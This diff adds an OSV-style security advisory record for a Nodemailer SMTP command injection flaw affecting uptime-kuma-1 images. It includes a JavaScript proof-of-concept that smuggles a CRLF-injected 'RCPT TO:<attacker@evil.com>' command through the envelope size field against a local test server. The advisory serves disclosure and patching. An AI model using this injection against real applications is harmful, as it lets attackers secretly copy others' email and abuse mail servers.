@@ -1,0 +1,59 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-saiq-rdwt-stss-xo72",
+  "modified": "2026-11-14T01:06:37Z",
+  "published": "2026-11-14T01:06:37Z",
+  "upstream": [
+    "GHSA-c7w3-x93f-qmm8"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nWhen a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\\r\\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` — silently adding attacker-controlled recipients to outgoing emails.\n\n\n### Details\nIn `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:\n\n```javascript\nif (this._envelope.size && this._supportedExtensions.includes('SIZE')) {\n    args.push('SIZE=' + this._envelope.size);\n}\n```\n\nThis contrasts with other envelope parameters in the same function that ARE properly sanitized:\n- **Addresses** (`from`, `to`): validated for `[\\r\\n<>]` at lines 1107-1127\n- **DSN parameters** (`dsn.ret`, `dsn.envid`, `dsn.orcpt`): encoded via `encodeXText()` at lines 1167-1183\n\nThe `size` property reaches this code path through `MimeNode.setEnvelope()` in `lib/mime-node/index.js` (lines 854-858), which copies all non-standard envelope properties verbatim:\n\n```javascript\nconst standardFields = ['to', 'cc', 'bcc', 'from'];\nObject.keys(envelope).forEach(key => {\n    if (!standardFields.includes(key)) {\n        this._envelope[key] = envelope[key];\n    }\n});\n```\n\nSince `_sendCommand()` writes the command string followed by `\\r\\n` to the raw TCP socket, a CRLF in the `size` value terminates the `MAIL FROM` command and starts a new SMTP command.\n\nNote: by default, Nodemailer constructs the envelope automatically from the message's `from`/`to` fields and does not include `size`. This vulnerability requires the application to explicitly pass a custom `envelope` object with a `size` property to `sendMail()`. \nWhile this limits the attack surface, applications that expose envelope configuration to users are affected.\n\n### PoC\nave the following as `poc.js` and run with `node poc.js`:\n\n```javascript\nconst net = require('net');\nconst nodemailer = require('nodemailer');\n\n// Minimal SMTP server that logs raw commands\nconst server = net.createServer(socket => {\n    socket.write('220 localhost ESMTP\\r\\n');\n    let buffer = '';\n    socket.on('data', chunk => {\n        buffer += chunk.toString();\n        const lines = buffer.split('\\r\\n');\n        buffer = lines.pop();\n        for (const line of lines) {\n            if (!line) continue;\n            console.log('C:', line);\n            if (line.startsWith('EHLO')) {\n                socket.write('250-localhost\\r\\n250-SIZE 10485760\\r\\n250 OK\\r\\n');\n            } else if (line.startsWith('MAIL FROM')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('RCPT TO')) {\n                socket.write('250 OK\\r\\n');\n            } else if (line === 'DATA') {\n                socket.write('354 Start\\r\\n');\n            } else if (line === '.') {\n                socket.write('250 OK\\r\\n');\n            } else if (line.startsWith('QUIT')) {\n                socket.write('221 Bye\\r\\n');\n                socket.end();\n            }\n        }\n    });\n});\n\nserver.listen(0, '127.0.0.1', () => {\n    const port = server.address().port;\n    console.log('SMTP server on port', port);\n    console.log('Sending email with injected RCPT TO...\\n');\n\n    const transporter = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port,\n        secure: false,\n        tls: { rejectUnauthorized: false },\n    });\n\n    transporter.sendMail({\n        from: 'sender@example.com',\n        to: 'recipient@example.com',\n        subject: 'Normal email',\n        text: 'This is a normal email.',\n        envelope: {\n            from: 'sender@example.com',\n            to: ['recipient@example.com'],\n            size: '100\\r\\nRCPT TO:<attacker@evil.com>',\n        },\n    }, (err) => {\n        if (err) console.error('Error:', err.message);\n        console.log('\\nExpected output above:');\n        console.log('  C: MAIL FROM:<sender@example.com> SIZE=100');\n        console.log('  C: RCPT TO:<attacker@evil.com>        <-- INJECTED');\n        console.log('  C: RCPT TO:<recipient@example.com>');\n        server.close();\n        transporter.close();\n    });\n});\n```\n\n**Expected output:**\n```\nSMTP server on port 12345\nSending email with injected RCPT TO...\n\nC: EHLO [127.0.0.1]\nC: MAIL FROM:<sender@example.com> SIZE=100\nC: RCPT TO:<attacker@evil.com>\nC: RCPT TO:<recipient@example.com>\nC: DATA\n...\nC: .\nC: QUIT\n```\n\nThe `RCPT TO:<attacker@evil.com>` line is injected by the CRLF in the `size` field, silently adding an extra recipient to the email.\n\n### Impact\nThis is an SMTP command injection vulnerability. An attacker who can influence the `envelope.size` property in a `sendMail()` call can:\n\n- **Silently add hidden recipients** to outgoing emails via injected `RCPT TO` commands, receiving copies of all emails sent through the affected transport\n- **Inject arbitrary SMTP commands** (e.g., `RSET`, additional `MAIL FROM` to send entirely separate emails through the server)\n- **Leverage the sending organization's SMTP server reputation** for spam or phishing delivery\n\nThe severity is mitigated by the fact that the `envelope` object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include `size`. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.\n\nAffected versions: at least v8.0.3 (current); likely all versions where `envelope.size` is supported.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-saiq-rdwt-stss-xo72"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-c7w3-x93f-qmm8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651"
+    }
+  ]
+}
